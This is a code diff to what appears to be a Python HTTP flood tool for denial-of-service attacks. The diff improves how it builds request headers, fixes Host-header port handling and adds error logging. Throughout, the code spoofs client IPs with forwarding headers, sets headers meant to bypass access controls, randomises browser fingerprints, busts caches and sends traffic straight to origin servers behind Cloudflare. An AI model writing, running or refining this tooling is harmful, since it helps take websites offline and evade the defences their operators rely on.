@@ -1046,7 +1046,7 @@ def discover_known_paths(target, host):
     loop.close()
     return good
 
-def build_headers(host, profile=None, method="GET"):
+def build_headers(host, profile=None, method="GET", port=None):
     ip1 = gen_ip()
     ip2 = gen_ip()
     ip3 = gen_ip()
@@ -1055,10 +1055,16 @@ def build_headers(host, profile=None, method="GET"):
     ua = profile["ua"] if profile else random.choice(UA_LIST)
     lang = profile.get("lang","en-US,en;q=0.9") if profile else random.choice([
         "en-US,en;q=0.9","en-GB,en;q=0.9","pl-PL,pl;q=0.9",
-        "de-DE,de;q=0.9","fr-FR,fr;q=0.9","es-ES,es;q=0.9"])
+        "de-DE,de;q=0.9","fr-FR,fr;q=0.9","es-ES,fr;q=0.9"])
+
+    # Host header must include non-standard port
+    if port and port not in (80, 443):
+        host_header = f"{host}:{port}"
+    else:
+        host_header = host
 
     h = {
-        "Host": host,
+        "Host": host_header,
         "User-Agent": ua,
         "Accept": random.choice([
             "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
@@ -1067,21 +1073,15 @@ def build_headers(host, profile=None, method="GET"):
             "text/html,application/xhtml+xml,application/xml;q=0.9,application/json;q=0.8",
         ]),
         "Accept-Language": lang,
-        "Accept-Encoding": random.choice(ACCEPT_ENCODING_BOMB),
-        "Cache-Control": random.choice(["no-cache","max-age=0","no-store","must-revalidate"]),
-        "Connection": random.choice(["keep-alive","Keep-Alive","close"]),
-        "Upgrade-Insecure-Requests": "1",
+        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "identity"]),
+        "Cache-Control": random.choice(["no-cache","max-age=0"]),
         "Sec-Fetch-Dest": "document",
         "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": random.choice(["none","same-origin","cross-site"]),
+        "Sec-Fetch-Site": "none",
         "Sec-Fetch-User": "?1",
         "Sec-Ch-Ua": f'"Chromium";v="{random.randint(128,142)}", "Google Chrome";v="{random.randint(128,142)}", "Not=A?Brand";v="99"',
         "Sec-Ch-Ua-Mobile": "?0",
-        "Sec-Ch-Ua-Platform": random.choice(['"Windows"','"macOS"','"Linux"','"Android"']),
-        "Pragma": "no-cache",
-        "X-Forwarded-For": ip1,
-        "X-Real-IP": ip2,
-        "X-Request-ID": rid,
+        "Sec-Ch-Ua-Platform": random.choice(['"Windows"','"macOS"','"Linux"']),
     }
 
     if boost_mode:
@@ -1090,13 +1090,13 @@ def build_headers(host, profile=None, method="GET"):
         h["If-Modified-Since"] = f"{random.randint(2020,2025)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}T{random.randint(0,23):02d}:{random.randint(0,59):02d}:{random.randint(0,59):02d}Z"
         h["X-Forwarded-For"] = f"{gen_ip()}, {gen_ip()}, {gen_ip()}, {ip1}"
         h["X-Real-IP"] = ip3
-        h["X-Forwarded-Host"] = host
+        h["X-Forwarded-Host"] = host_header
         h["X-Original-URL"] = random.choice(PRIMARY_PATHS+SECONDARY_PATHS)
         h["X-Rewrite-URL"] = random.choice(PRIMARY_PATHS+SECONDARY_PATHS)
         h["X-Custom-IP-Authorization"] = ip3
         h["CF-Connecting-IP"] = ip3
         h["CF-IPCountry"] = random.choice(["US","DE","PL","GB","JP","FR","NL","CA","AU","BR","SE","NO","FI","DK","IT","ES","MX","IN","KR","TW"])
-        h["Forwarded"] = f"for={ip3};proto=https;by={gen_ip()};host={host}"
+        h["Forwarded"] = f"for={ip3};proto=https;by={gen_ip()};host={host_header}"
         h["Via"] = f"{random.randint(1,2)}.{random.randint(0,9)} {random.choice(['squid','nginx','varnish','haproxy','envoy','traefik','caddy','apache','lighttpd'])}"
         if random.random() > 0.5:
             h["X-HTTP-Method-Override"] = random.choice(["GET","POST","HEAD"])
@@ -1109,7 +1109,7 @@ def build_headers(host, profile=None, method="GET"):
 
     if bypass_active and not boost_mode:
         h["X-Client-IP"] = gen_ip()
-        h["X-Forwarded-Host"] = host
+        h["X-Forwarded-Host"] = host_header
         h["X-HTTP-Method-Override"] = "GET"
         h["X-Forwarded-Proto"] = "https"
         h["X-Forwarded-Scheme"] = "https"
@@ -1117,7 +1117,7 @@ def build_headers(host, profile=None, method="GET"):
         h["X-Remote-IP"] = gen_ip()
         h["Client-IP"] = gen_ip()
         h["X-Cluster-Client-IP"] = gen_ip()
-        h["Forwarded"] = f"for={gen_ip()};proto=https;by={gen_ip()};host={host}"
+        h["Forwarded"] = f"for={gen_ip()};proto=https;by={gen_ip()};host={host_header}"
         h["Via"] = f"{random.randint(1,2)}.{random.randint(0,9)} {random.choice(['squid','nginx','varnish','haproxy','envoy','traefik','caddy'])}"
         h["CF-IPCountry"] = random.choice(["US","DE","PL","GB","JP","FR","NL","CA","AU","BR"])
         h["True-Client-IP"] = gen_ip()
@@ -1127,13 +1127,12 @@ def build_headers(host, profile=None, method="GET"):
 
     if method in ("POST", "PUT", "PATCH"):
         h["Content-Type"] = random.choice(POST_CONTENT_TYPES)
-        h["Content-Length"] = str(payload_size)
-        h["X-Content-Type-Options"] = "nosniff"
+        # Content-Length is set automatically by aiohttp based on actual data
 
     if random.random() > 0.4:
         h["Referer"] = f"https://www.google.com/search?q={rv}"
     if random.random() > 0.3:
-        h["Origin"] = f"https://{host}"
+        h["Origin"] = f"https://{host_header}"
     if random.random() > 0.5:
         c = base64.b64encode(random.randbytes(12)).decode()[:16]
         h["Cookie"] = f"_ga=GA1.2.{random.randint(100000000,999999999)}.{random.randint(1000000000,9999999999)}; sid={c}"
@@ -1148,11 +1147,11 @@ def build_headers(host, profile=None, method="GET"):
         h["CF-Visitor"] = json.dumps({"scheme":"https"})
         h["X-Forwarded-For"] = f"{ip3}, {gen_ip()}, {ip1}"
         h["X-Real-IP"] = ip3
-        h["X-Forwarded-Host"] = host
+        h["X-Forwarded-Host"] = host_header
         h["X-Original-URL"] = random.choice(PRIMARY_PATHS + SECONDARY_PATHS)
         h["X-Rewrite-URL"] = random.choice(PRIMARY_PATHS + SECONDARY_PATHS)
         h["X-Custom-IP-Authorization"] = ip3
-        h["Forwarded"] = f"for={ip3};proto=https;by={gen_ip()};host={host}"
+        h["Forwarded"] = f"for={ip3};proto=https;by={gen_ip()};host={host_header}"
         if random.random() > 0.5:
             h["X-HTTP-Method-Override"] = random.choice(["GET","POST","HEAD"])
 
@@ -1193,7 +1192,7 @@ async def attack_worker(session, url_obj, host, tid):
             path = pick_path()
         if boost_mode or multi_method or cf_kill:
             path = cache_bust(path)
-        headers = build_headers(host, profile, method)
+        headers = build_headers(host, profile, method, port=url_obj.port)
 
         if cf_kill and direct_origin and origin_ips:
             origin_ip = random.choice(origin_ips)
@@ -1311,6 +1310,9 @@ async def attack_worker(session, url_obj, host, tid):
                             cf_bypass_count += 1
                     else:
                         total_failed += 1
+                        if total_failed <= 20:
+                            body_snip = body[:120].decode("utf-8", "ignore").replace("\n", " ")
+                            log_error(f"HTTP {code} | target={target} | body={body_snip}")
                     if method == "GET":
                         total_get_sent += 1
                     elif method == "POST":
@@ -1696,7 +1698,7 @@ def main():
             ssl_ctx = _browser_ssl_context() if scheme == "https" else False
             connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=1, force_close=True)
             async with aiohttp.ClientSession(connector=connector) as s:
-                p_headers = build_headers(host, None, "GET")
+                p_headers = build_headers(host, None, "GET", port=port)
                 p_target = f"{scheme}://{parsed.netloc}/"
                 async with s.get(p_target, headers=p_headers,
                                  timeout=aiohttp.ClientTimeout(total=10),
